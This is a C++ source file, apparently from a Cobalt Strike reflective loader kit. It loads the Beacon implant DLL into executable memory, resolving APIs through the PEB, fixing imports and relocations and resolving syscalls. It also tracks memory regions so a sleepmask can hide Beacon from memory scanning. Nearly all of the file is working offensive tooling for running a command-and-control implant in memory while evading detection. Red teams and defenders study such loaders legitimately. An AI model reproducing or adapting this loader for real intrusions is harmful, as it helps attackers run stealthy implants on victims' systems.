//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "End.h"
#include "Utils.h"
#include "FunctionResolving.h"
#include "StdLib.h"
#include "BeaconUserData.h"
#include "SyscallResolving.h"
#include "TrackMemory.h"

/**
 * The position independent reflective loader
 *
 * @return The target DLL's entry point
*/
extern "C" {
#pragma code_seg(".text$a")
    ULONG_PTR __cdecl ReflectiveLoader() {
        // STEP 0: Determine the start address of the loader
#ifdef _WIN64
        // A rip relative address is calculated in x64
        void* loaderStart = &ReflectiveLoader;
#elif _WIN32
        /*
        * &ReflectiveLoader does not work on x86, since it does not support eip relative addressing
        * Therefore, it is calculated by substracting the function prologue from the current address
        * This is subject to change depending upon the compiler/compiler settings. This could result
        * in issues with Beacon/the postex DLL's cleanup routines. As a result, when writing x86 loaders
        * we strongly recommend verifying that the correct value is subtracted from the result of 
        * GetLocation(). GetLocation() will return the address of the instruction following
        * the function call. In the example below, GetLocation() returns 0x00000014 which is why 
        * we subtract 0x14 to get back to 0x0. In our testing, this value can change and can sometimes 
        * cause crashes during cleanup.
        * 
        * The generated disassembly from IDA:
        *
        * text:00000000                 push    ebp
        * text:00000001                 mov     ebp, esp
        * text:00000003                 and     esp, 0FFFFFFF8h
        * text:00000006                 sub     esp, 10Ch
        * text:0000000C                 push    ebx
        * text:0000000D                 push    esi
        * text:0000000E                 push    edi
        * text:0000000F                 call    GetLocation
        * text:00000014                 mov     ebx, eax
        */
        void* loaderStart = (char*)GetLocation() - 0x14;
#endif
        PRINT("[+] Loader Base Address: %p\n", loaderStart);

        // STEP 1: Determine the base address of whatever we are loading
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddress();
        PRINT("[+] Raw DLL Base Address: %p\n", rawDllBaseAddress);

        // STEP 2: Determine the location of the NtHeader
        PIMAGE_DOS_HEADER rawDllDosHeader = (PIMAGE_DOS_HEADER)rawDllBaseAddress;
        PIMAGE_NT_HEADERS rawDllNtHeader = (PIMAGE_NT_HEADERS)(rawDllBaseAddress + rawDllDosHeader->e_lfanew);

        // STEP 3: Resolve the functions the loader needs...
        _PPEB pebAddress = GetPEBAddress();
        WINDOWSAPIS winApi = { 0 };
        if (!ResolveBaseLoaderFunctions(pebAddress, &winApi)) {
            return NULL;
        }

        // STEP 4: Initialize Beacon User Data
        USER_DATA userData;
        SYSCALL_API syscalls;
        RTL_API rtlFunctions;
        ALLOCATED_MEMORY allocatedMemory;
        
        /** 
        * Initialize the structures with a custom _memset() call to prevent
        * the compiler from inserting one. 
        */
        _memset(&userData, 0, sizeof(USER_DATA));
        _memset(&syscalls, 0, sizeof(SYSCALL_API));
        _memset(&rtlFunctions, 0, sizeof(RTL_API));
        _memset(&allocatedMemory, 0, sizeof(ALLOCATED_MEMORY));
        userData.syscalls = &syscalls;
        userData.rtls = &rtlFunctions;
        userData.allocatedMemory = &allocatedMemory;
        userData.version = COBALT_STRIKE_VERSION;

        /**
        * STEP 5: Create a new location in memory for the loaded image...
        * We're using PAGE_EXECUTE_READWRITE as it's an example (and Beacon's default),
        * but note - stage.userwx "true";
        */
        DWORD memoryProtection = PAGE_EXECUTE_READWRITE;
        DWORD memoryType = MEM_PRIVATE;
        DWORD loadedImageSize = rawDllNtHeader->OptionalHeader.SizeOfImage;
        ULONG_PTR loadedDllBaseAddress = (ULONG_PTR)winApi.VirtualAlloc(NULL, loadedImageSize, MEM_RESERVE | MEM_COMMIT, memoryProtection);

        if (loadedDllBaseAddress == NULL) {
            PRINT("[-] Failed to allocate memory. Exiting..\n");
            return NULL;
        }
        else {
            PRINT("[+] Allocated memory: 0x%p\n", loadedDllBaseAddress);
        }
        
        // STEP 6: Define relevant cleanup information.
        ALLOCATED_MEMORY_CLEANUP_INFORMATION cleanupMemoryInformation;
        _memset(&cleanupMemoryInformation, 0, sizeof(ALLOCATED_MEMORY_CLEANUP_INFORMATION));
        cleanupMemoryInformation.AllocationMethod = ALLOCATED_MEMORY_ALLOCATION_METHOD::METHOD_VIRTUALALLOC;
        cleanupMemoryInformation.Cleanup = TRUE;

        /**
        * STEP 7: Track the allocated memory region 
        * 
        * We track memory for two reasons:
        * - To mask it whilst Beacon sleeps
        * - To cleanup the memory on exit
        *
        * The allocated memory API uses the concept of regions and sections:
        * 
        * - A region is an allocation of memory created by APIs like 
        * VirtualAlloc(). A region is tracked to ensure that Beacon has the
        * information it needs to clean/free the memory on exit. There are
        * 6 AllocatedMemoryRegions available in Beacon User Data.
        * - A section is an area of memory within a given region. Sections
        * can be tracked independently and masked via the Sleepmask. Each
        * AllocatedMemoryRegion has space for 8 individual sections.
        *
        * The contract between regions/sections has been poorly illustrated below:
        *   __________
        * |   Region  |
        * |  _______  |
        * | |Section| |
        * | |_______| |
        * |  _______  |
        * | |Section| |
        * | |_______| |
        * |  _______  |
        * | |Section| |
        * | |_______| |
        * | _________ |
        * 
        * The bud-loader example tracks the region allocated for the loaded Beacon image. 
        * Beacon's individual sections are then also tracked to facilitate masking via
        * the Sleepmask. This is done via TrackAllocatedMemorySection() in the 
        * CopyBeaconAndTrackMemory() function below.
        * 
        * Note: TrackAllocatedMemoryBuffer() is a wrapper function that tracks a region
        * and adds information required by the Sleepmask to the first section entry. This
        * provides a simple mechanism to allocate and track generic buffers (See STEP 11).
        */
        TrackAllocatedMemoryRegion(&userData.allocatedMemory->AllocatedMemoryRegions[0], PURPOSE_BEACON_MEMORY, (PVOID)loadedDllBaseAddress, loadedImageSize, memoryType, &cleanupMemoryInformation);
        
        // STEP 8: Copy Beacon into memory block and track each of its sections
        CopyDllAndTrackMemory(&userData.allocatedMemory->AllocatedMemoryRegions[0], rawDllBaseAddress, loadedDllBaseAddress, COPY_PEHEADER::COPY_TRUE, memoryProtection, ALLOCATED_MEMORY_MASK_MEMORY_BOOL::MASK_TRUE);

        // STEP 9: Process Beacon's import table...
        ResolveImports(rawDllNtHeader, loadedDllBaseAddress, &winApi);

        // STEP 10: Process Beacon's relocations...
        ProcessRelocations(rawDllNtHeader, loadedDllBaseAddress);

        /**
        * STEP 11: Allocate buffers for BOF/Sleepmask memory and track them
        * 
        * BudLoaderAllocateBuffer() calls TrackAllocatedMemoryBuffer() which is a 
        * wrapper around TrackAllocatedMemoryRegion() and TrackAllocatedMemorySection(). 
        * TrackAllocatedMemoryRegion ensures the allocation is tracked to support
        * cleanup. TrackAllocatedMemorySection then populates the first section entry 
        * with the information required by the Sleepmask.
        * 
        * Note: Ensure that any memory intended for BOF/Sleepmask execution
        * is writable. Beacon will copy the content into it, and then change the
        * permissions based on the malleable C2 profile.
        */
        if (!BudLoaderAllocateBuffer(&userData.allocatedMemory->AllocatedMemoryRegions[1], PURPOSE_BOF_MEMORY, BOF_MEMORY_SIZE, PAGE_READWRITE, MASK_TRUE, &winApi)) {
            PRINT("[-] Failed to allocate BOF memory. Exiting..\n");
            return NULL;
        }
        if(!BudLoaderAllocateBuffer(&userData.allocatedMemory->AllocatedMemoryRegions[2], PURPOSE_SLEEPMASK_MEMORY, SLEEPMASK_MEMORY_SIZE, PAGE_READWRITE, MASK_TRUE, &winApi)) {
            PRINT("[-] Failed to allocate Sleepmask memory. Exiting..\n");
            return NULL;
        }

        /**
        * STEP 12: Resolve the syscall information and populate the SYSCALL_API/SYSCALL_API_ENTRY structure
        * 
        * Note: To fully support all syscalls in Beacon, we need to resolve some
        * additional Run Time Library (RTL) addresses as well. If these
        * functions are not resolved, Beacon will fall back to the standard
        * Windows API.
        *
        * These RTL functions are required for the following:
        * - ntCreateFile
        */
        ResolveSyscalls(&syscalls);
        ResolveRtlFunctions(&rtlFunctions);
 
        // STEP 13: Fill the custom data buffer
        _memset(&userData.custom, 0x41, BEACON_USER_DATA_CUSTOM_SIZE);

        // STEP 14: Find the target DLL's entry point.
        ULONG_PTR entryPoint = loadedDllBaseAddress + rawDllNtHeader->OptionalHeader.AddressOfEntryPoint;
        PRINT("[+] Entry point: %p \n", entryPoint);

        // STEP 15: Flush the instruction cache to avoid stale code being used which was updated by our relocation processing       
        winApi.NtFlushInstructionCache((HANDLE)-1, NULL, 0);

        // STEP 16: Pass Beacon User Data to Beacon
        PRINT("[*] Calling the entry point (DLL_BEACON_USER_DATA)\n");
        ((DLLMAIN)entryPoint)(0, DLL_BEACON_USER_DATA, &userData);

        // STEP 17: Call Beacon's entrypoint(s)
        PRINT("[*] Calling the entry point (DLL_PROCESS_ATTACH)\n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loadedDllBaseAddress, DLL_PROCESS_ATTACH, NULL);
        PRINT("[*] Calling the entry point (0x4)\n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, 4, NULL);

        // STEP 18: Return our new entry point address so whatever called us can call DllMain() if needed
        return entryPoint;
    }
}

/*******************************************************************
 * To avoid problems with function positioning, do not add any new
 * functions above this pragma directive.
********************************************************************/
#pragma code_seg(".text$b")

/**
 * Allocate a buffer and track its memory information
 * 
 * @param allocatedMemoryRegion A pointer to the MEMORY_INFORMATION_REGION structure
 * @param purpose An enum to define the purpose of the memory allocation (i.e BEACON|SLEEPMASK|BOF|BUFFER)
 * @param bufferSize The required size of the buffer
 * @param memoryProtections The required memory protections
 * @param mask An enum to indicate whether the buffer should be masked
 * @param winApi A pointer to a structure of WINAPI pointers
 * @return A Boolean value to indicate success
*/
BOOL BudLoaderAllocateBuffer(PALLOCATED_MEMORY_REGION allocatedMemoryRegion, ALLOCATED_MEMORY_PURPOSE purpose, SIZE_T bufferSize, DWORD memoryProtections, ALLOCATED_MEMORY_MASK_MEMORY_BOOL mask, PWINDOWSAPIS winApis) {
    // Allocate the required buffer
    ULONG_PTR baseAddress = (ULONG_PTR)winApis->VirtualAlloc(NULL, bufferSize, MEM_RESERVE | MEM_COMMIT, memoryProtections);
    if (baseAddress == NULL) {
        return FALSE;
    }
 
    // Define cleanup information
    ALLOCATED_MEMORY_CLEANUP_INFORMATION cleanupMemoryInformation;
    _memset(&cleanupMemoryInformation, 0, sizeof(ALLOCATED_MEMORY_CLEANUP_INFORMATION));
    cleanupMemoryInformation.AllocationMethod = ALLOCATED_MEMORY_ALLOCATION_METHOD::METHOD_VIRTUALALLOC;
    cleanupMemoryInformation.Cleanup = TRUE;
    
    // Track the memory allocation
    TrackAllocatedMemoryBuffer(allocatedMemoryRegion, purpose, (PVOID)baseAddress, bufferSize, MEM_PRIVATE, memoryProtections, &cleanupMemoryInformation, mask);
    
    return TRUE;
}
